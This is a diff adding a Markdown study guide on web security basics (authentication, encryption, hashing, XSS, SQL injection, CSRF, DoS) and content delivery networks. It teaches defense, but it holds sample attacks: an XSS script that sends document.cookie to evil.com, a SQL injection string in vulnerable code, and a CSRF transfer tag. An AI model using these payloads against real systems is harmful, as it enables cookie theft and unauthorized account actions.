@@ -1,0 +1,735 @@
+# Security & Content Delivery Networks
+
+## Security Fundamentals
+
+Security is a critical aspect of system design. Understanding core concepts and implementing proper security measures protects both the system and its users.
+
+### Basic Security Concepts
+
+#### Authentication
+
+**Definition:** Verifying the identity of a user or system.
+
+**Answers:** "Who are you?"
+
+**Common Methods:**
+
+* **Username/Password:** Traditional, widely used
+* **Multi-Factor Authentication (MFA):** Password + code (SMS, app, hardware token)
+* **Biometric:** Fingerprint, face recognition
+* **OAuth/SAML:** Third-party authentication (Google, Facebook)
+* **API Keys:** For service-to-service communication
+* **Certificates:** Mutual TLS (mTLS)
+
+**Example:**
+
+```javascript
+// JWT-based authentication
+app.post('/login', async (req, res) => {
+    const { username, password } = req.body;
+
+    // Verify credentials
+    const user = await authenticateUser(username, password);
+
+    if (user) {
+        // Generate token
+        const token = jwt.sign(
+            { userId: user.id, role: user.role },
+            SECRET_KEY,
+            { expiresIn: '1h' }
+        );
+
+        res.json({ token });
+    } else {
+        res.status(401).json({ error: 'Invalid credentials' });
+    }
+});
+
+// Protected route
+app.get('/profile', authenticateToken, (req, res) => {
+    res.json({ user: req.user });
+});
+
+function authenticateToken(req, res, next) {
+    const token = req.headers['authorization']?.split(' ')[1];
+
+    if (!token) return res.status(401).json({ error: 'No token' });
+
+    jwt.verify(token, SECRET_KEY, (err, user) => {
+        if (err) return res.status(403).json({ error: 'Invalid token' });
+        req.user = user;
+        next();
+    });
+}
+```
+
+#### Authorization
+
+**Definition:** Determining what an authenticated user is allowed to do.
+
+**Answers:** "What can you do?"
+
+**Models:**
+
+* **Role-Based Access Control (RBAC):** Permissions based on roles
+* **Attribute-Based Access Control (ABAC):** Permissions based on attributes
+* **Access Control Lists (ACL):** Explicit permissions per resource
+
+**Example:**
+
+```javascript
+// RBAC example
+const roles = {
+    admin: ['read', 'write', 'delete'],
+    editor: ['read', 'write'],
+    viewer: ['read']
+};
+
+function authorize(requiredPermission) {
+    return (req, res, next) => {
+        const userRole = req.user.role;
+        const permissions = roles[userRole];
+
+        if (permissions.includes(requiredPermission)) {
+            next();
+        } else {
+            res.status(403).json({ error: 'Forbidden' });
+        }
+    };
+}
+
+// Usage
+app.delete('/users/:id', authenticateToken, authorize('delete'), deleteUser);
+```
+
+#### Encryption
+
+**Definition:** Converting data into unreadable format to protect confidentiality.
+
+**Types:**
+
+##### Symmetric Encryption
+
+**Characteristics:**
+
+* Same key for encryption and decryption
+* Fast
+* Key distribution challenge
+
+**Algorithms:** AES, ChaCha20
+
+**Example:**
+
+```javascript
+const crypto = require('crypto');
+
+// Encrypt
+function encrypt(text, key) {
+    const iv = crypto.randomBytes(16);
+    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
+    let encrypted = cipher.update(text, 'utf8', 'hex');
+    encrypted += cipher.final('hex');
+    return iv.toString('hex') + ':' + encrypted;
+}
+
+// Decrypt
+function decrypt(encryptedData, key) {
+    const parts = encryptedData.split(':');
+    const iv = Buffer.from(parts[0], 'hex');
+    const encrypted = parts[1];
+    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
+    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
+    decrypted += decipher.final('utf8');
+    return decrypted;
+}
+```
+
+##### Asymmetric Encryption
+
+**Characteristics:**
+
+* Public key encrypts, private key decrypts
+* Slower than symmetric
+* No key distribution problem
+
+**Algorithms:** RSA, ECC
+
+**Use cases:**
+
+* Digital signatures
+* SSL/TLS handshake
+* Secure key exchange
+
+#### Hashing
+
+**Definition:** One-way transformation of data to fixed-size value.
+
+**Characteristics:**
+
+* Irreversible (can't decrypt)
+* Same input → same hash
+* Small change → completely different hash
+* Fixed output size
+
+**Use cases:**
+
+* Password storage
+* Data integrity verification
+* Digital signatures
+
+**Algorithms:** SHA-256, bcrypt (for passwords)
+
+**Example:**
+
+```javascript
+const bcrypt = require('bcrypt');
+
+// Hash password
+async function hashPassword(password) {
+    const saltRounds = 10;
+    return await bcrypt.hash(password, saltRounds);
+}
+
+// Verify password
+async function verifyPassword(password, hash) {
+    return await bcrypt.compare(password, hash);
+}
+
+// Usage
+const hashedPassword = await hashPassword('mySecretPassword');
+// Store hashedPassword in database
+
+// Later, during login
+const isValid = await verifyPassword('mySecretPassword', hashedPassword);
+```
+
+**Important:** Never store passwords in plain text!
+
+#### Integrity
+
+**Definition:** Ensuring data hasn't been tampered with.
+
+**Methods:**
+
+* **Checksums:** Detect accidental changes
+* **Cryptographic Hashes:** Detect intentional tampering
+* **HMAC:** Hash-based Message Authentication Code
+* **Digital Signatures:** Verify sender and integrity
+
+**Example:**
+
+```javascript
+// HMAC for data integrity
+const crypto = require('crypto');
+
+function generateHMAC(data, secret) {
+    return crypto.createHmac('sha256', secret)
+                 .update(data)
+                 .digest('hex');
+}
+
+function verifyHMAC(data, hmac, secret) {
+    const expectedHMAC = generateHMAC(data, secret);
+    return crypto.timingSafeEqual(
+        Buffer.from(hmac),
+        Buffer.from(expectedHMAC)
+    );
+}
+
+// Send data with HMAC
+const message = JSON.stringify({ amount: 100, recipient: 'user123' });
+const hmac = generateHMAC(message, SECRET);
+
+// Receiver verifies
+if (verifyHMAC(message, hmac, SECRET)) {
+    // Data is authentic and unmodified
+    processMessage(message);
+}
+```
+
+### Common Security Threats
+
+#### Cross-Site Scripting (XSS)
+
+**What it is:** Injecting malicious scripts into web pages viewed by others.
+
+**Example Attack:**
+
+```html
+<!-- Attacker submits this as a comment -->
+<script>
+    // Steal cookies
+    fetch('https://evil.com/steal?cookie=' + document.cookie);
+</script>
+
+<!-- Without sanitization, this executes in victim's browser -->
+```
+
+**Prevention:**
+
+```javascript
+// Sanitize user input
+const escapeHtml = (text) => {
+    const map = {
+        '&': '&amp;',
+        '<': '&lt;',
+        '>': '&gt;',
+        '"': '&quot;',
+        "'": '&#039;'
+    };
+    return text.replace(/[&<>"']/g, (m) => map[m]);
+};
+
+// Use Content Security Policy (CSP)
+app.use((req, res, next) => {
+    res.setHeader(
+        'Content-Security-Policy',
+        "default-src 'self'; script-src 'self'"
+    );
+    next();
+});
+
+// Modern frameworks (React, Vue) escape by default
+```
+
+#### SQL Injection
+
+**What it is:** Injecting malicious SQL code through user input.
+
+**Example Attack:**
+
+```javascript
+// Vulnerable code
+const username = req.body.username; // "admin' OR '1'='1"
+const query = `SELECT * FROM users WHERE username = '${username}'`;
+// Results in: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
+// Returns all users!
+```
+
+**Prevention:**
+
+```javascript
+// Use parameterized queries
+const username = req.body.username;
+const query = 'SELECT * FROM users WHERE username = ?';
+db.query(query, [username]); // Safe
+
+// Or use ORM
+const user = await User.findOne({ where: { username } }); // Safe
+```
+
+#### Cross-Site Request Forgery (CSRF)
+
+**What it is:** Tricking users into performing unwanted actions on authenticated site.
+
+**Example Attack:**
+
+```html
+<!-- Malicious website -->
+<img src="https://bank.com/transfer?to=attacker&amount=1000">
+<!-- If user is logged into bank.com, this executes -->
+```
+
+**Prevention:**
+
+```javascript
+// CSRF tokens
+const csrf = require('csurf');
+app.use(csrf({ cookie: true }));
+
+app.get('/form', (req, res) => {
+    res.render('form', { csrfToken: req.csrfToken() });
+});
+
+app.post('/submit', (req, res) => {
+    // Token automatically verified
+    processForm(req.body);
+});
+
+// SameSite cookies
+res.cookie('session', sessionId, {
+    sameSite: 'strict',
+    secure: true,
+    httpOnly: true
+});
+```
+
+#### Denial of Service (DoS)
+
+**What it is:** Overwhelming system with requests to make it unavailable.
+
+**Prevention:**
+
+* Rate limiting
+* CAPTCHA
+* CDN with DDoS protection
+* Auto-scaling
+* Load balancing
+
+```javascript
+// Rate limiting
+const rateLimit = require('express-rate-limit');
+
+const limiter = rateLimit({
+    windowMs: 15 * 60 * 1000, // 15 minutes
+    max: 100, // Max 100 requests per window
+    message: 'Too many requests, please try again later'
+});
+
+app.use('/api/', limiter);
+```
+
+#### Distributed Denial of Service (DDoS)
+
+**What it is:** DoS attack from multiple sources (botnet).
+
+**Prevention:**
+
+* CDN with DDoS protection (Cloudflare, Akamai)
+* Anycast network
+* Traffic analysis and filtering
+* Cloud auto-scaling
+* Firewall rules
+
+### Certificates and Certificate Authorities
+
+#### SSL/TLS Certificates
+
+**Purpose:**
+
+* Encrypt data in transit
+* Verify server identity
+* Enable HTTPS
+
+**Components:**
+
+* **Public key:** Shared with clients
+* **Private key:** Kept secret on server
+* **Certificate Authority (CA) signature:** Proves authenticity
+
+**How HTTPS Works:**
+
+1. Client connects to server
+2. Server sends certificate (with public key)
+3. Client verifies certificate with CA
+4. Client generates session key, encrypts with server's public key
+5. Server decrypts with private key
+6. Both use session key for symmetric encryption
+
+#### Certificate Authority (CA)
+
+**Role:** Trusted third party that issues and signs certificates.
+
+**Popular CAs:**
+
+* Let's Encrypt (free, automated)
+* DigiCert
+* GlobalSign
+* Sectigo
+
+**Trust Chain:**
+
+```
+Root CA
+  └── Intermediate CA
+        └── Your Server Certificate
+```
+
+Browsers trust root CAs → trust your certificate.
+
+### Security Best Practices
+
+#### 1. Principle of Least Privilege
+
+Grant minimum necessary permissions.
+
+```javascript
+// Bad: Admin access for everything
+if (user.isAdmin) { allowAccess(); }
+
+// Good: Specific permissions
+if (user.hasPermission('delete_user')) { allowAccess(); }
+```
+
+#### 2. Defense in Depth
+
+Multiple layers of security.
+
+```
+Firewall → WAF → Load Balancer → App Security → DB Security
+```
+
+#### 3. Input Validation
+
+Never trust user input.
+
+```javascript
+// Validate and sanitize
+const validator = require('validator');
+
+if (!validator.isEmail(email)) {
+    return res.status(400).json({ error: 'Invalid email' });
+}
+
+if (!validator.isLength(username, { min: 3, max: 20 })) {
+    return res.status(400).json({ error: 'Invalid username length' });
+}
+```
+
+#### 4. Secure Data Storage
+
+* Encrypt sensitive data at rest
+* Hash passwords (bcrypt, Argon2)
+* Use hardware security modules (HSM) for keys
+* Regular backups (encrypted)
+
+#### 5. Audit Logging
+
+Log security-relevant events.
+
+```javascript
+// Log authentication attempts
+logger.info('Login attempt', {
+    userId: user.id,
+    ip: req.ip,
+    userAgent: req.headers['user-agent'],
+    success: true,
+    timestamp: new Date()
+});
+
+// Log authorization failures
+logger.warn('Unauthorized access attempt', {
+    userId: user.id,
+    resource: '/admin/users',
+    ip: req.ip
+});
+```
+
+#### 6. Regular Security Updates
+
+* Keep dependencies updated
+* Monitor security advisories
+* Automated vulnerability scanning
+
+```bash
+# Check for vulnerable dependencies
+npm audit
+
+# Update dependencies
+npm update
+
+# Automated tools
+# - Snyk
+# - Dependabot
+# - OWASP Dependency-Check
+```
+
+## Content Delivery Network (CDN)
+
+### What is a CDN?
+
+A **Content Delivery Network (CDN)** is a geographically distributed group of servers that work together to provide fast delivery of internet content.
+
+### How CDN Works
+
+**Traditional (No CDN):**
+
+```
+User in Tokyo → Origin Server in New York → High latency
+```
+
+**With CDN:**
+
+```
+User in Tokyo → CDN Edge Server in Tokyo → Low latency
+                ↑
+         (cached from Origin Server)
+```
+
+**Process:**
+
+1. User requests content
+2. DNS routes to nearest CDN edge server
+3. If edge has cached content, return immediately
+4. If not (cache miss), fetch from origin, cache, return
+5. Subsequent requests served from cache
+
+### Benefits of CDN
+
+#### 1. Improved Performance
+
+* Content served from geographically closer servers
+* Reduced latency
+* Faster page load times
+
+**Example:**
+
+```
+Origin server in US, user in Australia:
+Without CDN: 200ms latency
+With CDN: 20ms latency (from Sydney edge)
+```
+
+#### 2. Reduced Origin Server Load
+
+* Static content served from edge
+* Origin handles only dynamic content and cache misses
+* Lower infrastructure costs
+
+#### 3. Scalability
+
+* Absorb traffic spikes
+* Handle millions of concurrent users
+* No need to scale origin for static content
+
+#### 4. Availability and Reliability
+
+* If one edge server fails, route to another
+* DDoS protection
+* Geographic redundancy
+
+#### 5. Global Reach
+
+* Serve users worldwide with low latency
+* Automatic routing to optimal server
+
+### CDN Use Cases
+
+#### Static Assets
+
+* Images, videos, audio
+* CSS, JavaScript files
+* Fonts
+* Documents (PDFs)
+
+**Example:**
+
+```html
+<!-- Without CDN -->
+<img src="https://example.com/images/logo.png">
+
+<!-- With CDN -->
+<img src="https://cdn.example.com/images/logo.png">
+```
+
+#### Video Streaming
+
+* Adaptive bitrate streaming
+* Live streaming
+* Video on demand (VOD)
+
+#### Software Distribution
+
+* Application downloads
+* Updates and patches
+* Game assets
+
+#### Website Acceleration
+
+* HTML caching (with proper invalidation)
+* Dynamic content acceleration
+* SSL/TLS termination
+
+### Popular CDN Providers
+
+* **Cloudflare:** Free tier, DDoS protection, WAF
+* **Amazon CloudFront:** Integrated with AWS
+* **Akamai:** Enterprise-grade, largest network
+* **Fastly:** Real-time configuration, edge computing
+* **Azure CDN:** Integrated with Azure
+* **Google Cloud CDN:** Global Google network
+
+### CDN Configuration
+
+**Cache Headers:**
+
+```javascript
+app.get('/static/*', (req, res) => {
+    // Cache for 1 year
+    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
+    // ...serve file
+});
+
+app.get('/api/*', (req, res) => {
+    // Don't cache dynamic content
+    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
+    // ...handle API request
+});
+```
+
+**Cache Invalidation:**
+
+```javascript
+// When content updates, purge CDN cache
+await cdn.purgeCache('/images/logo.png');
+
+// Or use versioned URLs (cache-busting)
+// Old: /assets/styles.css
+// New: /assets/styles.css?v=2
+// Or: /assets/styles.v2.css
+```
+
+### CDN Best Practices
+
+#### 1. Use Long Cache Times for Static Assets
+
+```
+Immutable assets (versioned): 1 year
+Images: 30 days
+HTML: 5 minutes or no-cache
+```
+
+#### 2. Version Assets
+
+```html
+<!-- Automatically updated by build tools -->
+<link rel="stylesheet" href="/css/styles.a1b2c3.css">
+<script src="/js/app.d4e5f6.js"></script>
+```
+
+#### 3. Use CDN for Appropriate Content
+
+* ✅ Static assets
+* ✅ Large files
+* ❌ Personalized content (without edge computing)
+* ❌ Frequently changing data
+
+#### 4. Monitor CDN Performance
+
+* Cache hit ratio (aim for >90%)
+* Origin requests
+* Bandwidth savings
+* Error rates
+
+#### 5. Implement Security
+
+* HTTPS only
+* Geo-blocking (if needed)
+* Token authentication for sensitive content
+* DDoS protection
+
+## Summary
+
+**Security Fundamentals:**
+
+* **Authentication:** Verify identity
+* **Authorization:** Control access
+* **Encryption:** Protect data confidentiality
+* **Hashing:** One-way transformation (passwords)
+* **Integrity:** Prevent tampering
+
+**Common Threats:**
+
+* XSS: Sanitize input, use CSP
+* SQL Injection: Parameterized queries
+* CSRF: Tokens, SameSite cookies
+* DoS/DDoS: Rate limiting, CDN, auto-scaling
+
+**CDN:**
+
+* Distributed servers for content delivery
+* Improves performance, scalability, availability
+* Reduces origin server load
+* Essential for global applications
+
+Security and performance through CDN are not optional for modern web applications—they're essential for user trust and system reliability.
